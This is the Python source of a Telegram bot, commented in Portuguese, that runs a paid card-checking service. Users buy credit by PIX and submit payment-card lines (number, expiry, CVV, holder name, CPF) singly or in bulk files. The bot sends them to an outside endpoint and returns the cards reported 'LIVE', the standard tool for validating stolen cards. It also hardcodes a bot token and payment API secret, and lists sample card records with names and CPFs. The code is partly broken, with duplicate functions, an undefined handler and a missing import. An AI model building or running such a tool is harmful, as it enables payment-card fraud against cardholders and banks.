import os
import json
import random
import string
import threading
import asyncio
import requests
import time
import os
from supabase import create_client, Client
import qrcode
from io import BytesIO
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========= CONFIGURAÇÕES =========
TELEGRAM_TOKEN = "8749925154:AAEJWRD7IGpULIvncMyDk-jusu5iPL6WJHE"
ADMIN_ID = 8467946444

# Configurações MisticPay - CORRIGIDAS
CLIENT_ID = "ci_libdweclsjyry50"
CLIENT_SECRET = "cs_kknlfy76fe2ir4nqjydf8ebee"
BASE_URL = "https://api.misticpay.com/api"  # ← DEFINIDO CORRETAMENTE

# API de checkout
CHECKOUT_API_URL = "https://naomexer-602p.onrender.com/api.php"

# Arquivos de dados
USERS_FILE = "users.json"
CODES_FILE = "codes.json"
TRANSACTIONS_FILE = "transactions.json"
PENDING_PIX_FILE = "pending_pix.json"

# ========= CONFIGURAÇÃO SUPABASE =========
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

if not SUPABASE_URL or not SUPABASE_KEY:
    print("❌ Erro: SUPABASE_URL e SUPABASE_KEY não configurados!")
    exit(1)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
print("✅ Conectado ao Supabase!")

# ========= FUNÇÕES DE ACESSO AO BANCO =========

def init_user(user_id, username, first_name):
    """Inicializa um novo usuário no Supabase"""
    try:
        # Verificar se usuário já existe
        response = supabase.table('users').select('*').eq('id', user_id).execute()
        
        if not response.data:
            # Criar novo usuário
            new_user = {
                'id': user_id,
                'username': username,
                'first_name': first_name,
                'balance': 0.0,
                'total_checked': 0,
                'live_checks': 0,
                'die_checks': 0,
                'created_at': datetime.now().isoformat(),
                'last_activity': datetime.now().isoformat()
            }
            supabase.table('users').insert(new_user).execute()
            return new_user
        
        return response.data[0]
        
    except Exception as e:
        print(f"❌ Erro init_user: {e}")
        return None

def update_balance(user_id, amount, operation_type, details=""):
    """Atualiza o saldo do usuário no Supabase"""
    try:
        # Buscar usuário
        user_response = supabase.table('users').select('*').eq('id', user_id).execute()
        
        if not user_response.data:
            return False
        
        user = user_response.data[0]
        old_balance = user.get('balance', 0)
        new_balance = old_balance + amount
        
        # Atualizar saldo
        supabase.table('users').update({
            'balance': new_balance,
            'last_activity': datetime.now().isoformat()
        }).eq('id', user_id).execute()
        
        # Registrar transação
        supabase.table('transactions').insert({
            'user_id': user_id,
            'amount': amount,
            'type': operation_type,
            'details': details,
            'balance_before': old_balance,
            'balance_after': new_balance,
            'created_at': datetime.now().isoformat()
        }).execute()
        
        print(f"✅ Saldo atualizado: {user_id} → R$ {new_balance:.2f}")
        return True
        
    except Exception as e:
        print(f"❌ Erro update_balance: {e}")
        return False

# ========= FUNÇÕES AUXILIARES =========
def load_json(file_path):
    if not os.path.exists(file_path):
        return {}
    with open(file_path, 'r', encoding='utf-8') as f:
        return json.load(f)

def save_json(file_path, data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def init_user(user_id, username, first_name):
    users = load_json(USERS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            "id": user_id,
            "username": username,
            "first_name": first_name,
            "balance": 0.0,
            "total_checked": 0,
            "live_checks": 0,
            "die_checks": 0,
            "created_at": datetime.now().isoformat(),
            "last_activity": datetime.now().isoformat()
        }
        save_json(USERS_FILE, users)
    return users[user_id_str]

def update_balance(user_id, amount, operation_type, details=""):
    users = load_json(USERS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in users:
        return False
    users[user_id_str]["balance"] += amount
    users[user_id_str]["last_activity"] = datetime.now().isoformat()
    save_json(USERS_FILE, users)
    
    transactions = load_json(TRANSACTIONS_FILE)
    if user_id_str not in transactions:
        transactions[user_id_str] = []
    transactions[user_id_str].append({
        "date": datetime.now().isoformat(),
        "amount": amount,
        "type": operation_type,
        "details": details,
        "balance_after": users[user_id_str]["balance"]
    })
    save_json(TRANSACTIONS_FILE, transactions)
    return True

def generate_code(length=20):
    """Gera código aleatório"""
    import random
    import string
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def check_card(card_data):
    try:
        response = requests.get(CHECKOUT_API_URL, params={"lista": card_data}, timeout=30)
        if response.status_code == 200:
            result = response.json()
            return result.get('status') == 'LIVE', result
        return False, {"error": f"HTTP {response.status_code}"}
    except Exception as e:
        return False, {"error": str(e)}

# ========= FUNÇÕES MISTICPAY CORRIGIDAS =========

def create_pix_qrcode(amount, user_name="Cliente", user_document="00000000000"):
    """Gera QR Code PIX via MisticPay"""
    headers = {
        "ci": CLIENT_ID,
        "cs": CLIENT_SECRET,
        "Content-Type": "application/json"
    }
    
    transaction_id = f"TX{int(time.time())}{random.randint(100, 999)}"
    
    payload = {
        "amount": amount,
        "payerName": user_name,
        "payerDocument": user_document,
        "transactionId": transaction_id,
        "description": f"Recarga de saldo - R$ {amount:.2f}"
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/transactions/create",
            json=payload,
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 201:  # Note: 201, não 200
            data = response.json()
            transaction_data = data.get("data", {})
            
            return {
                "success": True,
                "qr_code_base64": transaction_data.get("qrCodeBase64"),
                "qr_code_url": transaction_data.get("qrcodeUrl"),
                "copy_paste": transaction_data.get("copyPaste"),
                "transaction_id": transaction_data.get("transactionId"),
                "amount": amount
            }
        else:
            return {"success": False, "error": f"HTTP {response.status_code}"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}

def check_pix_status(transaction_id):
    """Verifica status do PIX na MisticPay"""
    headers = {
        "ci": CLIENT_ID,
        "cs": CLIENT_SECRET,
        "Content-Type": "application/json"
    }
    
    try:
        # Endpoint para consultar transação (ajuste conforme documentação)
        response = requests.get(
            f"{BASE_URL}/transactions/status/{transaction_id}",
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            # Verificar se a transação está paga
            state = data.get("data", {}).get("transactionState", "")
            return state == "APROVADO" or state == "CONFIRMADO", data
        return False, {}
    except Exception as e:
        print(f"[MisticPay] Erro status: {e}")
        return False, {}

# ========= COMANDOS DO BOT =========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = init_user(user.id, user.username, user.first_name)
    
    keyboard = [
        [InlineKeyboardButton("💰 Saldo", callback_data="balance"),
         InlineKeyboardButton("📊 Estatísticas", callback_data="stats")],
        [InlineKeyboardButton("💳 Verificar Cartão", callback_data="check"),
         InlineKeyboardButton("📁 Verificar Arquivo", callback_data="file_check")],
        [InlineKeyboardButton("🎫 Resgatar Código", callback_data="redeem"),
         InlineKeyboardButton("💸 Recarregar via PIX", callback_data="pix_recharge")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🤖 Bem-vindo ao Checkout Bot!\n\n"
        f"👤 Usuário: {user.first_name}\n"
        f"💰 Saldo atual: R$ {user_data['balance']:.2f}\n"
        f"📊 Total de verificações: {user_data['total_checked']}\n\n"
        f"✅ Live: {user_data['live_checks']}\n"
        f"❌ Die: {user_data['die_checks']}",
        reply_markup=reply_markup
    )

async def pix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /pix + valor + nome + cpf"""
    user = update.effective_user
    
    if len(context.args) < 3:
        await update.message.reply_text(
            "❌ Uso correto: /pix 10 NOME CPF\n\n"
            "Exemplo: /pix 10 'João Silva' 12345678909\n\n"
            "Valor mínimo: R$ 10,00"
        )
        return
    
    try:
        amount = float(context.args[0])
        
        if amount < 10:
            await update.message.reply_text("❌ Valor mínimo é R$ 10,00")
            return
        
        # Extrair nome e CPF
        if len(context.args) > 3:
            name_parts = context.args[1:-1]
            payer_name = ' '.join(name_parts)
            payer_document = context.args[-1]
        else:
            payer_name = context.args[1]
            payer_document = context.args[2]
        
        # Limpar dados
        payer_name = payer_name.strip('"').strip("'")
        payer_document = ''.join(filter(str.isdigit, payer_document))
        
        if len(payer_document) != 11:
            await update.message.reply_text("❌ CPF inválido! Digite 11 números.")
            return
        
        await update.message.reply_text(f"⏳ Gerando PIX de R$ {amount:.2f}...")
        
        # Gerar PIX
        pix_data = create_pix_qrcode(amount, payer_name, payer_document)
        
        if not pix_data["success"]:
            await update.message.reply_text(f"❌ Erro: {pix_data.get('error', 'Erro desconhecido')}")
            return
        
        # Salvar transação pendente
        pending_tx = load_json(PENDING_PIX_FILE)
        pending_tx[pix_data["transaction_id"]] = {
            "user_id": user.id,
            "amount": amount,
            "payer_name": payer_name,
            "payer_document": payer_document,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(PENDING_PIX_FILE, pending_tx)
        
        # ========= ENVIAR QR CODE COMO IMAGEM =========
        import base64
        from io import BytesIO
        
        qr_base64 = pix_data.get("qr_code_base64", "")
        
        if qr_base64:
            # Remove o prefixo se existir
            if ',' in qr_base64:
                qr_base64 = qr_base64.split(',')[1]
            
            # Decodifica e envia como foto
            img_data = base64.b64decode(qr_base64)
            bio = BytesIO(img_data)
            
            await update.message.reply_photo(
                photo=bio,
                caption=f"✅ PIX Gerado!\n\n"
                       f"💰 Valor: R$ {amount:.2f}\n"
                       f"🆔 Transação: {pix_data['transaction_id']}\n\n"
                       f"⏰ Expira em 30 minutos"
            )
        else:
            # Fallback: gerar QR Code manualmente
            img = qrcode.make(pix_data["copy_paste"])
            bio = BytesIO()
            img.save(bio, 'PNG')
            bio.seek(0)
            await update.message.reply_photo(
                photo=bio,
                caption=f"✅ PIX Gerado!\n💰 Valor: R$ {amount:.2f}"
            )
        
        # ========= ENVIAR CÓDIGO COPIA E COLA COMO ARQUIVO =========
        copy_paste = pix_data.get("copy_paste", "")
        if copy_paste:
            import io
            file_content = f"PIX Copia e Cola - R$ {amount:.2f}\n\n{copy_paste}"
            file_io = io.BytesIO(file_content.encode('utf-8'))
            await update.message.reply_document(
                document=file_io,
                filename=f"pix_{pix_data['transaction_id']}.txt",
                caption="📋 Clique para copiar o código PIX"
            )
        
        # Iniciar verificação em background
        asyncio.create_task(check_pix_payment(pix_data["transaction_id"], user.id, amount, context))
        
    except ValueError:
        await update.message.reply_text("❌ Valor inválido! Use /pix 10 'Nome' 12345678909")
    except Exception as e:
        # Não enviar a mensagem de erro completa se for muito longa
        error_msg = str(e)
        if len(error_msg) > 100:
            error_msg = "Erro interno. Tente novamente."
        await update.message.reply_text(f"❌ {error_msg}")

async def check_pix_payment(transaction_id, user_id, amount, context):
    await asyncio.sleep(10)
    for i in range(36):
        paid, _ = check_pix_status(transaction_id)
        if paid:
            update_balance(user_id, amount, "pix_recarga", f"PIX {transaction_id}")
            await context.bot.send_message(
                chat_id=user_id,
                text=f"✅ Pagamento Confirmado!\n\n💰 R$ {amount:.2f} adicionados ao saldo!"
            )
            pending = load_json(PENDING_PIX_FILE)
            if transaction_id in pending:
                pending[transaction_id]["status"] = "paid"
                save_json(PENDING_PIX_FILE, pending)
            return
        await asyncio.sleep(50)
    await context.bot.send_message(chat_id=user_id, text="⏰ Tempo esgotado! O PIX não foi pago.")

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = init_user(user.id, user.username, user.first_name)
    
    if not context.args:
        await update.message.reply_text("❌ Uso: /chk NUMERO|MES|ANO|CVV|NOME|CPF")
        return
    
    card_data = ' '.join(context.args)
    
    if user_data['balance'] < 0.5:
        await update.message.reply_text(f"❌ Saldo insuficiente! R$ {user_data['balance']:.2f}")
        return
    
    msg = await update.message.reply_text("⏳ Verificando...")
    
    is_live, result = check_card(card_data)
    cost = 1.0 if is_live else 0.5
    
    update_balance(user.id, -cost, "check", f"Resultado: {'LIVE' if is_live else 'DIE'}")
    
    users = load_json(USERS_FILE)
    user_id_str = str(user.id)
    users[user_id_str]['total_checked'] += 1
    if is_live:
        users[user_id_str]['live_checks'] += 1
    else:
        users[user_id_str]['die_checks'] += 1
    users[user_id_str]['balance'] -= cost
    save_json(USERS_FILE, users)
    
    status_text = "✅ LIVE" if is_live else "❌ DIE"
    
    await msg.edit_text(
        f"{status_text}\n\n"
        f"💰 Custo: R$ {cost:.2f}\n"
        f"💵 Saldo: R$ {users[user_id_str]['balance']:.2f}"
    )

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /mchk + arquivo .txt - Verifica múltiplos cartões"""
    user = update.effective_user
    
    # Verificar se o usuário enviou um arquivo
    if not update.message.document:
        await update.message.reply_text(
            "❌ Uso correto: Envie um arquivo .txt junto com o comando /mchk\n\n"
            "O arquivo deve conter um cartão por linha no formato:\n"
            "NUMERO|MES|ANO|CVV|NOME|CPF\n\n"
            "Exemplo:\n"
            "5158940282614474|05|2030|138|Iracema Godoi|08855932780\n"
            "5453681033927680|03|2032|689|Maria Silva|12345678900"
        )
        return
    
    # Verificar se o arquivo é .txt
    file_name = update.message.document.file_name
    if not file_name.endswith('.txt'):
        await update.message.reply_text("❌ Por favor, envie um arquivo .txt")
        return
    
    # Baixar o arquivo
    await update.message.reply_text("📥 Baixando arquivo...")
    file = await update.message.document.get_file()
    file_path = f"temp_{user.id}_{int(time.time())}.txt"
    await file.download_to_drive(file_path)
    
    # Ler cartões do arquivo
    with open(file_path, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip()]
    
    os.remove(file_path)  # Remove arquivo temporário
    
    if not cards:
        await update.message.reply_text("❌ Arquivo vazio ou formato inválido!")
        return
    
    # Verificar saldo do usuário
    user_data = init_user(user.id, user.username, user.first_name)
    
    if user_data['balance'] < 0.5:
        await update.message.reply_text(
            f"❌ Saldo insuficiente!\n\n"
            f"💰 Seu saldo: R$ {user_data['balance']:.2f}\n"
            f"💸 Necessário mínimo: R$ 0.50\n\n"
            f"Use /pix para recarregar."
        )
        return
    
    # Mensagem de progresso
    msg = await update.message.reply_text(
        f"📁 Processando {len(cards)} cartões...\n"
        f"💰 Saldo atual: R$ {user_data['balance']:.2f}\n\n"
        f"⚡ Iniciando verificação..."
    )
    
    live_cards = []
    processed = 0
    total_cost = 0
    
    for i, card in enumerate(cards):
        # Verificar saldo antes de cada verificação
        current_user = load_json(USERS_FILE).get(str(user.id), {})
        if current_user.get('balance', 0) < 0.5:
            await msg.edit_text(
                f"⛔ Processamento interrompido!\n\n"
                f"💰 Saldo insuficiente: R$ {current_user.get('balance', 0):.2f}\n"
                f"✅ Processados: {processed}/{len(cards)}\n"
                f"🎯 Live encontrados: {len(live_cards)}\n"
                f"💸 Total gasto: R$ {total_cost:.2f}"
            )
            break
        
        # Verificar cartão
        is_live, result = check_card(card)
        cost = 1.0 if is_live else 0.5
        total_cost += cost
        
        # Atualizar saldo
        update_balance(user.id, -cost, "bulk_check", f"Cartão {i+1}: {'LIVE' if is_live else 'DIE'}")
        
        if is_live:
            live_cards.append(card)
        
        processed += 1
        
        # Atualizar estatísticas
        users = load_json(USERS_FILE)
        user_id_str = str(user.id)
        if user_id_str in users:
            users[user_id_str]['total_checked'] = users[user_id_str].get('total_checked', 0) + 1
            if is_live:
                users[user_id_str]['live_checks'] = users[user_id_str].get('live_checks', 0) + 1
            else:
                users[user_id_str]['die_checks'] = users[user_id_str].get('die_checks', 0) + 1
            save_json(USERS_FILE, users)
        
        # Atualizar mensagem a cada 10 cartões
        if (i + 1) % 10 == 0 or (i + 1) == len(cards):
            current_balance = load_json(USERS_FILE).get(str(user.id), {}).get('balance', 0)
            await msg.edit_text(
                f"📁 Processando arquivo...\n\n"
                f"📊 Progresso: {processed}/{len(cards)}\n"
                f"✅ Live encontrados: {len(live_cards)}\n"
                f"💰 Saldo restante: R$ {current_balance:.2f}\n"
                f"💸 Total gasto: R$ {total_cost:.2f}\n\n"
                f"🔄 Continuando..."
            )
        
        # Delay para não sobrecarregar
        await asyncio.sleep(0.5)
    
    # Gerar arquivo com cartões LIVE
    if live_cards:
        output_file = f"live_cards_{user.id}_{int(time.time())}.txt"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(live_cards))
        
        # Enviar arquivo
        current_balance = load_json(USERS_FILE).get(str(user.id), {}).get('balance', 0)
        await update.message.reply_document(
            document=open(output_file, 'rb'),
            filename=f"live_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            caption=f"✅ {len(live_cards)} cartões LIVE encontrados!\n\n"
                   f"📊 Total processados: {processed}\n"
                   f"💰 Saldo final: R$ {current_balance:.2f}\n"
                   f"💸 Total gasto: R$ {total_cost:.2f}"
        )
        os.remove(output_file)
    else:
        current_balance = load_json(USERS_FILE).get(str(user.id), {}).get('balance', 0)
        await update.message.reply_text(
            f"❌ Nenhum cartão LIVE encontrado!\n\n"
            f"📊 Total processados: {processed}\n"
            f"💰 Saldo final: R$ {current_balance:.2f}\n"
            f"💸 Total gasto: R$ {total_cost:.2f}"
        )

async def gerarcod_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /gerarcod + valor (APENAS ADMIN)"""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ Acesso negado!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Uso: /gerarcod VALOR")
        return
    
    try:
        amount = float(context.args[0])
        
        if amount <= 0:
            await update.message.reply_text("❌ Valor deve ser maior que zero!")
            return
        
        code = generate_code(20)
        
        # Salvar no Supabase
        supabase.table('codes').insert({
            'code': code,
            'value': amount,
            'created_by': user.id,
            'created_by_name': user.first_name,
            'created_at': datetime.now().isoformat(),
            'used': False
        }).execute()
        
        await update.message.reply_text(
            f"✅ Código gerado!\n\n"
            f"💰 Valor: R$ {amount:.2f}\n"
            f"🎫 Código: `{code}`\n\n"
            f"Use: `/resgatar {code}`",
            parse_mode='Markdown'
        )
        
    except ValueError:
        await update.message.reply_text("❌ Valor inválido!")

async def resgatar_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /resgatar + codigo"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("❌ Uso: /resgatar CODIGO")
        return
    
    code = context.args[0]
    
    try:
        # Buscar código no Supabase
        response = supabase.table('codes').select('*').eq('code', code).execute()
        
        if not response.data:
            await update.message.reply_text("❌ Código inválido!")
            return
        
        code_data = response.data[0]
        
        if code_data.get('used', False):
            await update.message.reply_text(f"❌ Código já usado em {code_data.get('used_at', '')[:10]}")
            return
        
        amount = code_data['value']
        
        # Adicionar saldo
        update_balance(user.id, amount, "resgate", f"Código: {code}")
        
        # Marcar código como usado
        supabase.table('codes').update({
            'used': True,
            'used_by': user.id,
            'used_by_name': user.first_name,
            'used_at': datetime.now().isoformat()
        }).eq('code', code).execute()
        
        # Buscar saldo atual
        user_data = supabase.table('users').select('balance').eq('id', user.id).execute()
        current_balance = user_data.data[0]['balance'] if user_data.data else 0
        
        await update.message.reply_text(
            f"✅ Resgatado R$ {amount:.2f}!\n"
            f"💰 Saldo atual: R$ {current_balance:.2f}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Erro: {e}")

async def resgatar_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /resgatar + codigo"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("❌ Uso: /resgatar CODIGO")
        return
    
    code = context.args[0]
    
    try:
        # Buscar código no Supabase
        response = supabase.table('codes').select('*').eq('code', code).execute()
        
        if not response.data:
            await update.message.reply_text("❌ Código inválido!")
            return
        
        code_data = response.data[0]
        
        if code_data.get('used', False):
            await update.message.reply_text(f"❌ Código já usado em {code_data.get('used_at', '')[:10]}")
            return
        
        amount = code_data['value']
        
        # Adicionar saldo
        update_balance(user.id, amount, "resgate", f"Código: {code}")
        
        # Marcar código como usado
        supabase.table('codes').update({
            'used': True,
            'used_by': user.id,
            'used_by_name': user.first_name,
            'used_at': datetime.now().isoformat()
        }).eq('code', code).execute()
        
        # Buscar saldo atual
        user_data = supabase.table('users').select('balance').eq('id', user.id).execute()
        current_balance = user_data.data[0]['balance'] if user_data.data else 0
        
        await update.message.reply_text(
            f"✅ Resgatado R$ {amount:.2f}!\n"
            f"💰 Saldo atual: R$ {current_balance:.2f}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Erro: {e}")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_data = init_user(user.id, user.username, user.first_name)
    
    if query.data == "balance":
        await query.edit_message_text(f"💰 Saldo: R$ {user_data['balance']:.2f}")
    elif query.data == "stats":
        await query.edit_message_text(
            f"📊 Estatísticas\n\n✅ Live: {user_data['live_checks']}\n"
            f"❌ Die: {user_data['die_checks']}\n"
            f"📈 Total: {user_data['total_checked']}"
        )
    elif query.data == "check":
        await query.edit_message_text("💳 Verificar Cartão\n\n/chk NUMERO|MES|ANO|CVV|NOME|CPF")
    elif query.data == "file_check":
        await query.edit_message_text("📁 Verificar Arquivo\n\nEnvie um arquivo .txt com /mchk")
    elif query.data == "pix_recharge":
        await query.edit_message_text("💸 Recarregar\n\n/pix valor\nMínimo: R$ 10,00")
    elif query.data == "redeem":
        await query.edit_message_text("🎫 Resgatar\n\n/resgatar CODIGO")

# ========= FLASK E MAIN =========
flask_app = Flask(__name__)

@flask_app.route('/health')
def health_check():
    return jsonify({'status': 'alive', 'message': 'Bot funcionando!'}), 200

def run_flask():
    flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

@flask_app.route('/pix_callback', methods=['POST'])
def pix_callback():
    """Webhook para receber confirmações de pagamento"""
    data = request.json
    print(f"[Webhook] Recebido: {data}")
    
    # Processar confirmação de pagamento
    transaction_id = data.get("transactionId")
    if transaction_id:
        pending = load_json(PENDING_PIX_FILE)
        if transaction_id in pending:
            pending[transaction_id]["status"] = "paid"
            save_json(PENDING_PIX_FILE, pending)
    
    return jsonify({"status": "ok"}), 200

def main():
    """Função principal"""
    print("🤖 Bot iniciando...")
    
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Comandos existentes
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("pix", pix_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    
    # Novos comandos
    application.add_handler(CommandHandler("gerarcod", gerarcod_command))
    application.add_handler(CommandHandler("resgatar", resgatar_command))
    application.add_handler(CommandHandler("saldo", saldo_command))
    
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("✅ Bot pronto!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("🌐 Servidor keep-alive rodando na porta 8080")
    time.sleep(2)
    main()
